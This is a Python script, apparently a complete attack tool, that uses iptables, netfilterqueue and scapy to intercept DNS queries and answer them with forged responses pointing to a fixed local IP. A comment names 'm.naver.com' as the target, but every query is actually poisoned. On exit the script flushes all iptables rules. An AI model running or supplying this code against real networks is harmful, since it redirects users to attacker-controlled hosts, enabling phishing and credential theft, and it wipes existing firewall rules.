import os
from netfilterqueue import NetfilterQueue

from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP

domain = 'm.naver.com'  # domain to be spoofed
localIP = '192.168.1.74'  # IP address for poisoned hosts.

os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')


def callback(data):
    payload = data.get_payload()
    pkt = IP(payload)

    if not pkt.haslayer(DNSQR):
        data.accept()
    else:
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                      DNS(
                          id=pkt[DNS].id,
                          qr=1,
                          aa=1,
                          qd=pkt[DNS].qd,
                          an=DNSRR(
                              rrname=pkt[DNS].qd.qname,
                              ttl=10,
                              rdata=localIP
                          )
                      )
        data.set_payload(str(spoofed_pkt))
        data.accept()


def main():
    q = NetfilterQueue()
    q.bind(1, callback)
    try:
        q.run()  # Main loop
    except KeyboardInterrupt:
        q.unbind()
        os.system('iptables -F')
        os.system('iptables -X')

if __name__ == '__main__':
    main()
